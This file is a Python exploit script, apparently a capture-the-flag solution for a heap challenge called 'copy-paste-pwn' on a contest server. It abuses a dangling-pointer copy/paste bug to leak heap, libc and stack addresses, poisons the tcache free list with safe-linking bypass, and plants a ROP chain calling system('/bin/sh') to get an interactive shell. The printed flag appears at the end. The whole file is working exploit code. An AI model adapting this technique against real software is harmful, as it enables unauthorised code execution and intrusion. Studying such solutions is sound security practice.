#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'copy-paste-pwn.wanictf.org', 'port':9009})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdin       = libc.symbols['_IO_2_1_stdin_']
offset_libc_mainarena   = offset_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    cp = CopyPaste(conn)

    cp.create(0, 0x18, b'\x00')
    cp.create(1, 0x20, b'b'*8)
    cp.create(2, 0x418, b'c'*8)
    cp.create(15, 0x38, b'X'*8)

    cp.copy(1)
    cp.delete(1)
    cp.paste(0)
    addr_heap_base = u64(cp.show(0)[:8])<<12
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    cp.delete(0)
    cp.create(0, 0x18, b'\x00')

    cp.copy(2)
    cp.delete(2)
    cp.paste(0)
    addr_libc_mainarena = u64(cp.show(0)[:8]) - 0x450
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_environ       = libc.symbols['environ']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    cp.delete(0)

    cp.create(14, 0x418, b'Y'*8)
    cp.create(14, 0x18, b'Y'*8)
    cp.create(0, 0x18, b'A'*0x18)
    cp.create(1, 0x20, b'B'*0x1f+p8(0xf1))
    cp.create(2, 0x88, b'C'*8)
    cp.create(3, 0x88, b'D'*8)

    cp.delete(15)
    cp.delete(14)
    cp.copy(1)
    cp.paste(0)
    cp.delete(1)
    cp.delete(3)
    cp.delete(2)

    cp.create(1, 0x38, b'a'*8)
    cp.delete(1)

    fake_chunk  = b'x'*0x38
    fake_chunk += p64(0x21)
    fake_chunk += p64(addr_libc_environ ^ (addr_heap_base>>12))
    fake_chunk += b'\x00'*0x10
    fake_chunk += p64(0x91)
    fake_chunk += p64(0xdeadbeef)
    cp.create(1, 0xe8, fake_chunk)

    cp.create(2, 8, b'\x00')
    cp.create(3, 0) # environ
    cp.copy(3)
    cp.paste(2)
    addr_stack = u64(cp.show(2))
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    fake_chunk  = b'x'*0x38
    fake_chunk += p64(0x21)
    fake_chunk += b'\x00'*0x18
    fake_chunk += p64(0x91)
    fake_chunk += p64(((addr_stack-0x120)&~0xf) ^ (addr_heap_base>>12))
    cp.delete(1)
    cp.create(1, 0xe8, fake_chunk)

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)

    fake_stack  = p64(rop.ret.address)*6
    fake_stack += bytes(rop)
    cp.create(4, 0x88, b'\x00')
    cp.create(5, 0x88, fake_stack)

    cp.exit()

class CopyPaste:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, idx, size, content=None):
        self.sendlineafter(b'choice: ', b'1')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b'size (0-4096): ', str(size).encode())
        if content is not None:
            self.sendafter(b'content: ', content)

    def show(self, idx):
        self.sendlineafter(b'choice: ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        return self.recvuntil(b'\n---- memu', drop=True)

    def copy(self, idx):
        self.sendlineafter(b'choice: ', b'3')
        self.sendlineafter(b'index: ', str(idx).encode())

    def paste(self, idx):
        self.sendlineafter(b'choice: ', b'4')
        self.sendlineafter(b'index: ', str(idx).encode())

    def delete(self, idx):
        self.sendlineafter(b'choice: ', b'5')
        self.sendlineafter(b'index: ', str(idx).encode())

    def exit(self):
        self.sendlineafter(b'choice: ', b'6')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # FLAG{d4n611n6_901n73r_3x1575}

if __name__=='__main__':
    main()

#==========
